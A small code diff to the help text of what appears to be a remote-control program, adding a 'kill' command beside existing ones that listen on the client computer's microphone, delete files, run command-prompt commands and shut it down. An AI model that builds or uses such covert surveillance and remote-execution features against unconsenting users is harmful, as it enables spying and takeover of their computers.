@@ -81,6 +81,7 @@ list_of_commands = "---------------------------------------- List of commands --
                    "\nlisten ----------------- listens on mic of client computer for set period of time (seconds)" \
                    "\nremove ----------------- removes file at given path from client computer" \
                    "\ncmd -------------------- executes command from command prompt on client computer" \
+                   "\nkill ------------------- kills specified task on client computer" \
                    "\nshutdown --------------- remote shutdown of client computer" \
                    "\nexit ------------------- exits program"
 
